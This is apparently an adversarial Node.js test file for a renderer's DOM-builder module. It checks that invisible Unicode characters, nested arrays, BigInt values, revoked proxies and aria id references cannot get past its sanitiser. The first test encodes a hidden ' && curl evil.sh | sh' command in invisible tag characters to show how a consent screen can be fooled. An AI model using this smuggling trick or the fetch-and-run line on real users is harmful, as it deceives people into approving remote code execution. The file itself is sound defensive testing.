'use strict';

// Second adversarial pass over src/renderer/wfx-dom.js. The first pass
// closed the bidi and NUL holes in the text path; these tests are the
// ones that survived that fix, plus the cases the fix created by
// treating two sibling code paths differently. Every test here is
// written to fail against the module as it stands and names the
// contract it believes is broken in its own title.

const { test } = require('node:test');
const assert = require('node:assert/strict');

const {
  createBuilder,
  WfxDomError,
  MAX_ATTR_VALUE,
  MAX_CHILD_DEPTH,
} = require('../../src/renderer/wfx-dom');

const MARKUP_SAFE_NAME = /^[A-Za-z_:][-A-Za-z0-9_:.]*$/;

// The same fake document the module's own tests use. It is repeated here
// rather than exported from the other file because a test double shared
// between an adversary and the code's author stops being independent
// evidence the moment the author edits it.
function makeElement(doc, tag, proto) {
  const node = proto ? Object.create(proto) : {};
  return Object.assign(node, {
    nodeType: 1,
    localName: tag,
    tagName: tag.toUpperCase(),
    attributes: new Map(),
    childNodes: [],
    ownerDocument: doc,
    setAttribute(name, value) {
      if (!MARKUP_SAFE_NAME.test(name)) throw new Error(`InvalidCharacterError: ${name}`);
      if (typeof value !== 'string') throw new Error(`setAttribute got a ${typeof value} value`);
      this.attributes.set(name, value);
    },
    getAttribute(name) {
      return this.attributes.has(name) ? this.attributes.get(name) : null;
    },
    appendChild(child) {
      this.childNodes.push(child);
      return child;
    },
  });
}

// `withNode` gives the document a defaultView carrying a Node
// constructor, which is what the real renderer has. The module's
// isRealNode consults it, so any behaviour that only appears when that
// constructor exists is invisible to a document without one, and the
// production window is the one with it.
function makeDocument(withNode) {
  const Node = withNode ? class Node {} : null;
  const proto = Node ? Node.prototype : null;
  const doc = {
    createElement(tag) { return makeElement(doc, tag, proto); },
    createTextNode(data) {
      if (typeof data !== 'string') throw new Error(`createTextNode got a ${typeof data}`);
      const n = proto ? Object.create(proto) : {};
      return Object.assign(n, { nodeType: 3, nodeName: '#text', data, childNodes: [] });
    },
    createDocumentFragment() {
      const f = proto ? Object.create(proto) : {};
      return Object.assign(f, {
        nodeType: 11,
        childNodes: [],
        appendChild(child) { this.childNodes.push(child); return child; },
      });
    },
  };
  if (Node) doc.defaultView = { Node };
  return doc;
}

function builder(withNode) {
  const made = createBuilder(makeDocument(withNode));
  assert.equal(made.ok, true, made.error);
  return made;
}

function textOf(node) {
  if (node.nodeType === 3) return node.data;
  return (node.childNodes || []).map(textOf).join('');
}

// Encodes a run of Unicode tag characters, U+E0000 to U+E007F. Each one
// is the ASCII character 0x20 higher in that plane, which is the whole
// point of the block: it is a complete, well formed, entirely invisible
// copy of ASCII.
function tagged(ascii) {
  let out = '';
  for (const ch of ascii) out += String.fromCodePoint(0xE0000 + ch.codePointAt(0));
  return out;
}

test('HOSTILE: Unicode tag characters carry a whole hidden command through the scrub', () => {
  const { el } = builder();

  // The consent gate is the screen where a user reads a stranger's
  // command and approves it. The module's header states that a string
  // which displays differently from the way it executes is the attack
  // this scrub exists to stop. U+E0000 to U+E007F is that attack in its
  // canonical form: a well formed surrogate pair per character, so the
  // import validator's unpaired-surrogate refusal never sees it, and
  // zero rendered width, so the gate shows the safe half only.
  const visible = 'git status';
  const hidden = tagged(' && curl evil.sh | sh');
  const payload = visible + hidden;

  const node = el('pre', {}, payload);
  const rendered = textOf(node);

  // The finding this test carries is right and the module was fixed for
  // it. Its original expected value, the bare string 'git status', was
  // not: it asked for the hidden run to be deleted, and a deleted run
  // renders as 'git status', which is precisely the display the payload
  // was built to produce. The module replaces instead, for the reason
  // written at REPLACEMENT in wfx-dom.js, so the assertion is written
  // against the property that actually protects the gate: not one of
  // those characters reached the DOM, and what the user reads cannot be
  // mistaken for the two-word command it is impersonating.
  assert.equal(/[\p{Cf}\p{Default_Ignorable_Code_Point}]/u.test(rendered), false,
    'the tag-character block reached the DOM intact, so the consent gate shows "git status" ' +
    'while the string handed to the agent CLI is a second command');
  assert.notEqual(rendered, visible,
    'the hidden run was deleted rather than reported, which leaves the gate showing exactly ' +
    'the safe half the payload wanted shown');
  assert.equal(rendered, visible + '�'.repeat([...hidden].length),
    'one replacement character per smuggled character, so the length of what was hidden is ' +
    'visible too');
});

test('HOSTILE: the invisible-character scrub misses four more Cf ranges', () => {
  const { el } = builder();

  // Every one of these is a format or filler character with no advance
  // width, and none of them is in INVISIBLE_RE. They are listed
  // separately from the tag block because each is a distinct range a fix
  // has to name, and a fix that closes only the famous one leaves the
  // rest of the channel open.
  const cases = [
    ['U+206A..206F deprecated format controls', '⁪⁫⁬⁭⁮⁯'],
    ['U+FE00..FE0F variation selectors', '︀️'],
    ['U+FFF9..FFFB interlinear annotation', '￹￺￻'],
    ['U+115F, U+1160, U+3164 Hangul fillers', 'ᅟᅠㅤ'],
  ];

  // Same correction as the test above: each character is reported as one
  // U+FFFD rather than removed, so the expected rendering is 'a', one
  // replacement per hidden character, then 'b'. What is under test is
  // unchanged, that none of these ranges reaches a text node.
  const leaked = [];
  for (const [label, chars] of cases) {
    const rendered = textOf(el('span', {}, `a${chars}b`));
    if (rendered !== `a${'�'.repeat([...chars].length)}b`) leaked.push(label);
  }

  assert.deepEqual(leaked, [],
    'these ranges are invisible in every browser and survive into rendered command text');
});

test('HOSTILE: a JSON-producible nested child array throws where the same shape in class does not', () => {
  const { el } = builder();

  // Round one established that a nested class list is content and must
  // stop silently at the depth cap rather than raise. A child list is
  // the same shape arriving through the same door, and JSON.parse
  // produces one for free, so the module header's claim that only a
  // self-referential array can reach this branch is false. The two paths
  // now disagree, and the child path is the one that turns a hostile
  // file into a blank pane.
  const json = `${'['.repeat(MAX_CHILD_DEPTH + 4)}"boom"${']'.repeat(MAX_CHILD_DEPTH + 4)}`;
  const fromManifest = JSON.parse(json);

  // The class path, for contrast: identical depth, no throw, no loss of
  // the surrounding element.
  let classList = ['keep'];
  for (let i = 0; i < MAX_CHILD_DEPTH + 4; i += 1) classList = [classList];
  assert.doesNotThrow(() => el('div', { class: classList }));

  let node = null;
  assert.doesNotThrow(() => { node = el('div', {}, fromManifest); },
    'a finite array out of JSON.parse is content and must not raise');
  assert.equal(node.localName, 'div');
});

test('HOSTILE: a BigInt attribute value skips the cap every other value obeys', () => {
  const { el } = builder();

  // resolveValue answers a bigint with a bare String(value) and returns
  // before capAttrValue is ever reached, so the one type whose decimal
  // expansion has no upper bound is the one type the ceiling does not
  // apply to. The header states that every string attribute is capped.
  const huge = 10n ** BigInt(MAX_ATTR_VALUE * 2);
  const node = el('div', { title: huge });

  assert.ok(node.getAttribute('title').length <= MAX_ATTR_VALUE,
    `title is ${node.getAttribute('title').length} code units against a cap of ${MAX_ATTR_VALUE}`);
});

test('HOSTILE: a foreign error escapes appendAll from the call describe() already guards', () => {
  const { el } = builder(true);

  // describe() wraps Array.isArray in a try precisely because it throws
  // on a revoked proxy, and appendAll calls the same function on the
  // same kind of value with no guard at all. The module header promises
  // that nothing leaves here without a code and that a foreign error
  // cannot escape mid-tree; this is the counterexample, and it is
  // reachable in production because the check runs before isRealNode.
  const { proxy, revoke } = Proxy.revocable({}, {});
  revoke();

  let caught = null;
  try {
    el('div', {}, proxy);
  } catch (err) {
    caught = err;
  }

  assert.ok(caught instanceof WfxDomError,
    `expected a coded refusal, got a bare ${caught && caught.constructor.name}: ${caught && caught.message}`);
});

test('HOSTILE: the aria id-reference attributes escape the namespace id and for are held to', () => {
  const { el } = builder();

  // The header says id, for, headers and name are namespaced rather than
  // free text, and shapeReference enforces that for exactly those four.
  // aria-labelledby, aria-describedby and aria-controls are IDREF and
  // IDREFS attributes with the same meaning and the same failure mode:
  // they name an element by id. They go through resolveValue only, so
  // they take any 4096 characters at all.
  const node = el('div', {
    aria: {
      labelledby: 'wf-canvas"] , *',
      describedby: 'not-in-our-namespace',
      controls: 'wfx-in-go',
    },
  });

  const leaked = ['aria-labelledby', 'aria-describedby', 'aria-controls']
    .filter((name) => node.getAttribute(name) !== null);

  assert.deepEqual(leaked, [],
    'these are id references and are not held to ID_REF_RE, unlike id, for and headers');
});
